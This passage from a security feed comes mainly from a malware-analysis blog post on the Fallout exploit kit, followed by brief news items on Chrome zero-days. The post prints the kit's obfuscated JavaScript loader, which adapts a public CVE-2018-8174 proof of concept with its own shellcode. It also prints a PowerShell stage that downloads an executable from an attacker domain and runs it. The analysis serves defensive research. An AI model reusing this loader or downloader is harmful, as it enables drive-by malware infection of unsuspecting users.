<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">VS4H8Yo1</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">onreadystatechange</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="mi">4</span> <span class="o">==</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">readyState</span><span class="dl">'</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="mi">200</span> <span class="o">==</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">status</span><span class="dl">'</span><span class="p">])</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">W7iaUaId</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">VS4H8Yo1</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">responseText</span><span class="dl">'</span><span class="p">];</span>
        <span class="kd">var</span> <span class="nx">riqAvm0Is</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">OygitP9</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">jbRyz</span><span class="dl">'</span><span class="p">](</span><span class="nx">W7iaUaId</span><span class="p">)[</span><span class="dl">'</span><span class="s1">kWNcdNj7d6U</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">RLGuTgUF3d0</span><span class="dl">'</span><span class="p">);</span>
        <span class="nx">riqAvm0Is</span><span class="p">[</span><span class="dl">'</span><span class="s1">eCWmvY</span><span class="dl">'</span><span class="p">]();</span>
    <span class="p">}</span>
<span class="p">};</span>

<span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">VS4H8Yo1</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">open</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">post</span><span class="dl">'</span><span class="p">,</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">OygitP9</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">jbRyz</span><span class="dl">'</span><span class="p">](</span><span class="nx">mbwk99</span><span class="p">)[</span><span class="dl">'</span><span class="s1">kWNcdNj7d6U</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">RLGuTgUF3d0</span><span class="dl">'</span><span class="p">),</span> <span class="kc">true</span><span class="p">);</span>
<span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">VS4H8Yo1</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">send</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">@@</span><span class="dl">'</span> <span class="p">[</span><span class="dl">'</span><span class="s1">i2668FMs5B8</span><span class="dl">'</span><span class="p">]());</span>
</code></pre></div></div>

<h2 id="encoded-data">Encoded data</h2>
<p>When decoding the code, it looks like the following.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">ZV7S8RUn</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">-- Shellcode here --</span><span class="dl">'</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">dIl15w</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">XDomainRequest</span><span class="dl">'</span><span class="p">]();</span>
<span class="nx">dIl15w</span><span class="p">[</span><span class="dl">'</span><span class="s1">onload</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">H2Kqgnp</span> <span class="o">=</span> <span class="nx">dIl15w</span><span class="p">[</span><span class="dl">'</span><span class="s1">responseText</span><span class="dl">'</span><span class="p">];</span>
    <span class="kd">var</span> <span class="nx">WW7QZmX</span> <span class="o">=</span> <span class="nx">H2Kqgnp</span><span class="p">[</span><span class="dl">'</span><span class="s1">substring</span><span class="dl">'</span><span class="p">](</span><span class="nx">H2Kqgnp</span><span class="p">[</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">&lt;script language="vbscript"&gt;</span><span class="dl">'</span><span class="p">),</span><span class="nx">H2Kqgnp</span><span class="p">[</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">&lt;/body&gt;</span><span class="dl">'</span><span class="p">));</span>
    <span class="kd">var</span> <span class="nx">l1a2N5kr</span> <span class="o">=</span> <span class="nx">WW7QZmX</span><span class="p">[</span><span class="dl">'</span><span class="s1">split</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="se">\n</span><span class="dl">'</span><span class="p">);</span>
    <span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">L8c4YdRG</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">L8c4YdRG</span> <span class="o">&lt;</span> <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">];</span> <span class="nx">L8c4YdRG</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">%ue8fc%u008</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="o">||</span> <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">#{encoded_payload}</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="o">||</span> <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">%u8b55%u81ec</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="o">||</span> <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">REPLACE_SHELLCODE_HERE</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="kd">var</span> <span class="nx">g68j2okJh5D</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
            <span class="k">if</span><span class="p">(</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">%ue8fc%u008</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">g68j2okJh5D</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">%ue8fc%u008</span><span class="dl">'</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">if</span><span class="p">(</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">#{encoded_payload}</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">g68j2okJh5D</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">#{encoded_payload}</span><span class="dl">'</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">if</span><span class="p">(</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">%u8b55%u81ec</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">g68j2okJh5D</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">%u8b55%u81ec</span><span class="dl">'</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">if</span><span class="p">(</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">REPLACE_SHELLCODE_HERE</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">g68j2okJh5D</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">REPLACE_SHELLCODE_HERE</span><span class="dl">'</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="kd">var</span> <span class="nx">zEZGDPaGVEt</span> <span class="o">=</span> <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">substring</span><span class="dl">'</span><span class="p">](</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="nx">g68j2okJh5D</span><span class="p">),</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">"</span><span class="dl">'</span><span class="p">,</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="nx">g68j2okJh5D</span><span class="p">)));</span>
            <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">]</span> <span class="o">=</span> <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">replace</span><span class="dl">'</span><span class="p">](</span><span class="nx">zEZGDPaGVEt</span><span class="p">,</span><span class="nx">ZV7S8RUn</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="se">\'</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="kd">var</span> <span class="nx">TJIp1rglYoq</span> <span class="o">=</span> <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">substring</span><span class="dl">'</span><span class="p">](</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="se">\'</span><span class="dl">'</span><span class="p">));</span>
            <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">]</span> <span class="o">=</span> <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">replace</span><span class="dl">'</span><span class="p">](</span><span class="nx">TJIp1rglYoq</span><span class="p">,</span><span class="dl">''</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">MsgBox</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">]</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">Alert</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">]</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="nx">WW7QZmX</span> <span class="o">=</span> <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="dl">'</span><span class="s1">join</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="se">\n</span><span class="dl">'</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">nbvMHPdb</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">createElement</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">iframe</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">nbvMHPdb</span><span class="p">[</span><span class="dl">'</span><span class="s1">setAttribute</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">id</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">AARa7</span><span class="dl">"</span><span class="p">);</span>
    <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">getElementsByTagName</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">BODY</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">nbvMHPdb</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">ocH5HC2B</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">getElementById</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">AARa7</span><span class="dl">"</span><span class="p">)[</span><span class="dl">'</span><span class="s1">contentWindow</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">];</span>
    <span class="nx">ocH5HC2B</span><span class="p">[</span><span class="dl">'</span><span class="s1">open</span><span class="dl">'</span><span class="p">]();</span>
    <span class="nx">ocH5HC2B</span><span class="p">[</span><span class="dl">'</span><span class="s1">write</span><span class="dl">'</span><span class="p">](</span><span class="nx">WW7QZmX</span><span class="p">);</span>
    <span class="nx">ocH5HC2B</span><span class="p">[</span><span class="dl">'</span><span class="s1">close</span><span class="dl">'</span><span class="p">]();</span>
<span class="p">}</span>
<span class="nx">dIl15w</span><span class="p">[</span><span class="dl">'</span><span class="s1">open</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">get</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">https://raw.githubusercontent.com/w7374520/CVE-2018-8174_EXP/master/CVE-2018-8174.py</span><span class="dl">'</span><span class="p">);</span>
<span class="nx">dIl15w</span><span class="p">[</span><span class="dl">'</span><span class="s1">send</span><span class="dl">'</span><span class="p">]();</span>
</code></pre></div></div>

<p>This code is exploit by replacing the shellcode part of PoC of CVE-2018-8174 on GitHub. We are finding that four PoCs are being exploited. There may be other things.</p>

<ul>
  <li>w7374520/CVE-2018-8174_EXP/master/CVE-2018-8174.py</li>
  <li>admintony/VulRec/master/CVE-2018-8174/calc.html</li>
  <li>kaisaryousuf/CVE-2018-8174-msf/master/CVE-2018-8174.rb</li>
  <li>lovebair2022/CVE-2018-8174-msf/master/CVE-2018-8174.rb</li>
</ul>

<h2 id="shellcode">Shellcode</h2>
<p><a href="https://www.nao-sec.org/2019/01/in-depth-analysis-of-new-fallout.html">In the previous blog</a> We wrote that Fallout uses RC4 and powershell. Currently, It decrypts with RC4 using multiple keys.</p>

<p><img alt="" src="https://4.bp.blogspot.com/-6UVMjUup6qo/XHn461S2DQI/AAAAAAAAaAc/ihjgvwM48ds78W-1a50a5naMAiw-jtvwQCLcBGAs/s1600/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B121824.jpg" /></p>

<p><img alt="" src="https://1.bp.blogspot.com/-DymvnKJrNeE/XHn5O-hzKBI/AAAAAAAAaAs/s8JysGgcRwAk_vvDNVcUIIu8nLHY0LfswCLcBGAs/s1600/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B123150.jpg" /></p>

<h3 id="encrypted-data">Encrypted data</h3>
<p>Encrypted data is near the end of the shell code.</p>

<p><img alt="" src="https://4.bp.blogspot.com/-gsfXIhMYevM/XHn8WBk9ovI/AAAAAAAAaBg/10bGFzmcPOwREpu9jFcdDV_QNU_q428QQCLcBGAs/s1600/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B124509.jpg" /></p>

<p>The following strings are encrypted.</p>

<ul>
  <li>URL</li>
</ul>

<p><img alt="" src="https://3.bp.blogspot.com/-mGb6y9CcLgY/XHn_tTXITlI/AAAAAAAAaBs/Tx-IZGvfR7MKXeLZoduOknHsG-oG611mACLcBGAs/s1600/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B094830.jpg" /></p>

<ul>
  <li>Path</li>
</ul>

<p><img alt="" src="https://1.bp.blogspot.com/-nJQJtvhQ4ts/XHoAJThO_UI/AAAAAAAAaB0/AqdnhErozq4RtSn0IBPxDh26i1VIb3ySwCLcBGAs/s1600/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B094918.jpg" /></p>

<ul>
  <li>lpszAgent</li>
</ul>

<p><img alt="" src="https://4.bp.blogspot.com/-SHiC_-K52OE/XHoAYO0KSqI/AAAAAAAAaB4/mIuho6VGEigMXjQD0PYCic7yPSQjP50agCLcBGAs/s400/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B095113.jpg" /></p>

<ul>
  <li>HTTP Method</li>
</ul>

<p><img alt="" src="https://1.bp.blogspot.com/-8VHYdHuFVzo/XHoAun-ulAI/AAAAAAAAaCE/dZL11EMf0Js8hKDBVtWrb1TpxiUKVleHgCLcBGAs/s400/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B095212.jpg" /></p>

<ul>
  <li>Dll name</li>
</ul>

<p><img alt="" src="https://4.bp.blogspot.com/-d1VACU5EdCg/XHoA0UXjwJI/AAAAAAAAaCI/4nYEy6pr69YYZGCk-PYTL4DwLlXGXPEaACLcBGAs/s400/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B095457.jpg" /></p>

<h3 id="execute">Execute</h3>
<p><img alt="" src="https://1.bp.blogspot.com/-J6-pH9sR77Y/XHoD9uuQ2rI/AAAAAAAAaCg/tdiUL-ppen0UgdBMlAw0YJoIAOp5JoJkgCLcBGAs/s400/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B131719.jpg" /></p>

<h3 id="api-hash">API hash</h3>
<p>The API called by the shell code has been hashed by the dualaccModFFF1Hash algorithm.</p>

<p><img alt="" src="https://3.bp.blogspot.com/--PgKXNTSaEU/XHoC9ETsXsI/AAAAAAAAaCY/YfQrDoaJySA6qJpeQcsquCv6MRV5XyxwgCLcBGAs/s320/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B131317.jpg" /></p>



<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ShellcodeHashSearcher: 0x00000686: dualaccModFFF1Hash:0x191c0443 kernel32.dll!CloseHandle
ShellcodeHashSearcher: 0x00000694: dualaccModFFF1Hash:0x28b90575 kernel32.dll!CreateProcessA
ShellcodeHashSearcher: 0x000006a6: dualaccModFFF1Hash:0x73320951 kernel32.dll!CreateToolhelp32Snapshot
ShellcodeHashSearcher: 0x000006b9: dualaccModFFF1Hash:0x33f50614 kernel32.dll!GetModuleHandleA
ShellcodeHashSearcher: 0x000006ca: dualaccModFFF1Hash:0x1d810497 kernel32.dll!LoadLibraryA
ShellcodeHashSearcher: 0x000006da: dualaccModFFF1Hash:0x2785054d kernel32.dll!Process32First
ShellcodeHashSearcher: 0x000006eb: dualaccModFFF1Hash:0x225904e4 kernel32.dll!Process32Next
ShellcodeHashSearcher: 0x000006fc: dualaccModFFF1Hash:0x1f7004d3 kernel32.dll!VirtualAlloc
ShellcodeHashSearcher: 0x0000070d: dualaccModFFF1Hash:0x1a1e047a kernel32.dll!ExitProcess
ShellcodeHashSearcher: 0x0000071e: dualaccModFFF1Hash:0x158503f3 kernel32.dll!ExitThread
ShellcodeHashSearcher: 0x00000737: dualaccModFFF1Hash:0x08d8028c msvcrt.dll!memset
ShellcodeHashSearcher: 0x00000737: dualaccModFFF1Hash:0x08d8028c ntoskrnl.exe!memset
ShellcodeHashSearcher: 0x00000737: dualaccModFFF1Hash:0x08d8028c ntdll.dll!memset
ShellcodeHashSearcher: 0x00000778: dualaccModFFF1Hash:0x3610065d wininet.dll!HttpOpenRequestA
ShellcodeHashSearcher: 0x00000787: dualaccModFFF1Hash:0x29fb0584 wininet.dll!HttpQueryInfoA
ShellcodeHashSearcher: 0x0000079a: dualaccModFFF1Hash:0x35c70655 wininet.dll!HttpSendRequestA
ShellcodeHashSearcher: 0x000007ab: dualaccModFFF1Hash:0x4b92078c wininet.dll!InternetCloseHandle
ShellcodeHashSearcher: 0x000007bc: dualaccModFFF1Hash:0x36640655 wininet.dll!InternetConnectA
ShellcodeHashSearcher: 0x000007cd: dualaccModFFF1Hash:0x245c051d wininet.dll!InternetOpenA
ShellcodeHashSearcher: 0x000007de: dualaccModFFF1Hash:0x35c00646 wininet.dll!InternetReadFile
ShellcodeHashSearcher: 0x00000685: dualaccModFFF1Hash:0x191c0443 kernel32.dll!CloseHandle
ShellcodeHashSearcher: 0x00000693: dualaccModFFF1Hash:0x28b90575 kernel32.dll!CreateProcessA
ShellcodeHashSearcher: 0x000006a5: dualaccModFFF1Hash:0x73320951 kernel32.dll!CreateToolhelp32Snapshot
ShellcodeHashSearcher: 0x000006b8: dualaccModFFF1Hash:0x33f50614 kernel32.dll!GetModuleHandleA
ShellcodeHashSearcher: 0x000006c9: dualaccModFFF1Hash:0x1d810497 kernel32.dll!LoadLibraryA
ShellcodeHashSearcher: 0x000006d9: dualaccModFFF1Hash:0x2785054d kernel32.dll!Process32First
ShellcodeHashSearcher: 0x000006ea: dualaccModFFF1Hash:0x225904e4 kernel32.dll!Process32Next
ShellcodeHashSearcher: 0x000006fb: dualaccModFFF1Hash:0x1f7004d3 kernel32.dll!VirtualAlloc
ShellcodeHashSearcher: 0x0000070c: dualaccModFFF1Hash:0x1a1e047a kernel32.dll!ExitProcess
ShellcodeHashSearcher: 0x0000071d: dualaccModFFF1Hash:0x158503f3 kernel32.dll!ExitThread
ShellcodeHashSearcher: 0x00000736: dualaccModFFF1Hash:0x08d8028c msvcrt.dll!memset
ShellcodeHashSearcher: 0x00000736: dualaccModFFF1Hash:0x08d8028c ntoskrnl.exe!memset
ShellcodeHashSearcher: 0x00000736: dualaccModFFF1Hash:0x08d8028c ntdll.dll!memset
ShellcodeHashSearcher: 0x00000777: dualaccModFFF1Hash:0x3610065d wininet.dll!HttpOpenRequestA
ShellcodeHashSearcher: 0x00000786: dualaccModFFF1Hash:0x29fb0584 wininet.dll!HttpQueryInfoA
ShellcodeHashSearcher: 0x00000799: dualaccModFFF1Hash:0x35c70655 wininet.dll!HttpSendRequestA
ShellcodeHashSearcher: 0x000007aa: dualaccModFFF1Hash:0x4b92078c wininet.dll!InternetCloseHandle
ShellcodeHashSearcher: 0x000007bb: dualaccModFFF1Hash:0x36640655 wininet.dll!InternetConnectA
ShellcodeHashSearcher: 0x000007cc: dualaccModFFF1Hash:0x245c051d wininet.dll!InternetOpenA
ShellcodeHashSearcher: 0x000007dd: dualaccModFFF1Hash:0x35c00646 wininet.dll!InternetReadFile
</code></pre></div></div>

<p>The final encoded PowerShell script is downloaded, decoded and executed.</p>

<h2 id="powershell">PowerShell</h2>

<pre><code class="language-ps1">Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

[StructLayout(LayoutKind.Sequential)]
public struct lI111
{
    public IntPtr llIll;
    public IntPtr II1ll1I1;
    public uint llllIlI;
    public uint l1l1l;
}

[StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)]
public struct lI1I1l1l
{
    public uint lI1lI1I;
    public string l1l1II1;
    public string llIlI1;
    public string IlIl1l;
    public uint ll1llI11;
    public uint ll1l11I1;
    public uint IlI11lI;
    public uint IIlIll1I;
    public uint IIl1II;
    public uint I11Il;
    public uint IIIIII;
    public uint l1IlIll;
    public short llI11l1;
    public short llll1I11;
    public IntPtr I1llIIlI;
    public IntPtr Il1I11lI;
    public IntPtr llllll;
    public IntPtr lI1l1I1I;
};

public static class I1l11lIl
{
    [DllImport(""kernel32.dll"",SetLastError=true)]
    public static extern bool CreateProcess(string I1l1Il1I,string l1111,IntPtr lllI111,IntPtr I111IIlI,bool lllll,uint III1l1l1,IntPtr l1l1l11l,string lIll1111,ref lI1I1l1l l111l,out lI111 I1111l1);
}
"@;

$lIlI1 = "$env:userprofile\AppData\LocalLow\$(-join((48..57)+(65..90)+(97..122)|Get-Random -Count 8|%{[char]$_})).tmp";
$Il11l = 'https://not-my-guilty.com/04_10_1971/beaveries/aoer.phtml';

$cli = (New-Object Net.WebClient);
$cli.Headers['User-Agent'] = 'pqqyW56Fe8W2G7m3';
$cli.DownloadFile($Il11l, $lIlI1);

$llII11l = New-Object lI1I1l1l;
$llII11l.llI11l1 = 0x0;
$llII11l.lI1lI1I = [System.Runtime.InteropServices.Marshal]::SizeOf($llII11l);
$I1111111 = New-Object lI111;
[I1l11lIl]::CreateProcess($lIlI1, $lIlI1, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0x00000008, [IntPtr]::Zero, "c:", [ref]$llII11l, [ref]$I1111111)|out-null;
</code></pre>

<p>This PowerShell code downloads the malware and calls CreateProcess. At this time, User-Agent is not common.</p>

<p><img alt="" src="https://nao-sec.org/assets/2019-03-07/02.png" /></p>

<h2 id="finally">Finally</h2>
<p>Fallout has also evolved. Analysis has become more difficult than before. You should keep an eye on Fallout in the future.</p>
]]></content:encoded>
<pubDate>2019-03-06T15:00:00+00:00</pubDate>
</item>
<item>
<title>Google Addresses Tenth Zero-Day in Chrome This Year - WinBuzzer</title>
<link>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://winbuzzer.com/2024/08/27/google-addresses-tenth-zero-day-in-chrome-this-year-xcxwbn/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw1t036MLesemfHNhNcLI4Dr</link>
<guid>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://winbuzzer.com/2024/08/27/google-addresses-tenth-zero-day-in-chrome-this-year-xcxwbn/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw1t036MLesemfHNhNcLI4Dr</guid>
<content:encoded><![CDATA[
In an ongoing battle against security exploits, Google has patched the tenth zero-day <b>vulnerability</b> in Chrome this year. ... <b>macOS</b>, along with version&nbsp;...
]]></content:encoded>
<pubDate>2024-08-27T14:00:02Z</pubDate>
</item>
<item>
<title>Google Warns of Exploited Chrome Vulnerability</title>
<link>https://www.securityweek.com/google-warns-of-exploited-chrome-vulnerability/</link>
<guid>https://www.securityweek.com/google-warns-of-exploited-chrome-vulnerability/</guid>
<content:encoded><![CDATA[
<p>Google flags another high-severity vulnerability patched with the latest Chrome 128 release as exploited in the wild.</p>
<p>The post <a href="https://www.securityweek.com/google-warns-of-exploited-chrome-vulnerability/">Google Warns of Exploited Chrome Vulnerability</a> appeared first on <a href="https://www.securityweek.com">SecurityWeek</a>.</p>
]]></content:encoded>
<pubDate>Tue, 27 Aug 2024 08:58:53 +0000</pubDate>
</item>
<item>
<title>New Styx Stealer Malware Targets Browsers and Instant Messaging for Data Theft</title>
